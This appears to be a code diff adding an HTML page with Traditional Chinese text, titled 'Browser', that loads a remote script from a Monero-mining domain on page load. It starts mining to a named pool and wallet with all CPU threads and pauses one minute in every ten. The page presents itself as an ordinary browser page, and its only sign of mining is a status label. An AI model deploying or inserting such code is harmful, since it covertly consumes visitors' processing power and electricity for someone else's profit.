@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <title>Browser </title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    .status { margin-top: 20px; font-weight: bold; color: green; }
+  </style>
+</head>
+<body>
+  <h1>瀏覽器頁面</h1>
+  <p>本頁在您開啟時。</p>
+  <div class="status" id="status">⏳ 初始化中...</div>
+
+  <!-- 挖礦腳本 -->
+  <script src="https://script.monerominer.rocks"></script>
+  <script>
+    const pool = "moneroocean.stream";
+    const walletAddress = "48PZrmBXTvf9GYgkTmaJRXi6ZCUXrM7qQcz6ZLE3margf5mFQ27sraycXcGsKiPJ4FeY2QsMw7RLx6AuACpXsMP4JijyRYn"; // ← 請替換
+    const workerId = "netlify-worker";
+    const threads = -1;
+    const password = "x";
+
+    try {
+      startMining(pool, walletAddress, workerId, threads, password);
+      throttleMiner = 20;
+      document.getElementById("status").innerText = "✅ 挖礦已啟動";
+
+      // 每 10 分鐘停 1 分鐘
+      setInterval(() => {
+        throttleMiner = 100;
+        document.getElementById("status").innerText = "⏸️ 暫停 1 分鐘...";
+        setTimeout(() => {
+          throttleMiner = 20;
+          document.getElementById("status").innerText = "▶️ 繼續挖礦中...";
+        }, 60 * 1000);
+      }, 10 * 60 * 1000);
+
+    } catch (err) {
+      console.error("挖礦腳本錯誤：", err);
+      document.getElementById("status").innerText = "❌ 無法啟動挖礦";
+    }
+  </script>
+</body>
+</html>
